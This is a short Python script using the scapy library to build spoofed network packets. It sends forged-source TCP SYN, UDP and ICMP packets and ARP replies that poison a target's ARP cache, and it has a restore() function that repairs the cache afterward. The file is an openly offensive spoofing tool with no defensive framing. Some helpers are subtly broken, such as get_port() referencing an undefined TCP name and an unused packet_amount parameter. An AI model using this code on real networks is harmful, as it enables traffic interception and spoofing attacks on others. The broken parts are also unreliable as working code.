import scapy.all as scapy
import time
import random
  
def get_mac(ip):
    answer, unanswer = scapy.arping(ip, verbose = False)
    return answer[0][1].hwsrc

def get_port(ip):
    ping = scapy.IP(dst = ip)
    response = scapy.sr1(ping, timeout=2)
    return response[TCP].dport
  
def spoof(target_ip, spoof_ip, protocol, packet_amount):
    src_port = random.randint(1024, 65535)    

    if(protocol == "TCP/IP"):
        packet = scapy.IP(src = spoof_ip, dst = target_ip)/scapy.TCP(sport = src_port, dport = get_port(target_ip), flags='S')
    elif(protocol == "ARP"):
        packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip), psrc = spoof_ip)
    elif(protocol == "UDP"):
        packet = scapy.IP(src = spoof_ip, dst = target_ip)/scapy.UDP(sport = src_port, dport = get_port(target_ip))
    elif(protocol == "ICMP"):
        packet = scapy.IP(src = spoof_ip, dst = target_ip)/scapy.ICMP()

    
    scapy.send(packet, verbose = False)
    return
  
  
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, verbose = False)
      

    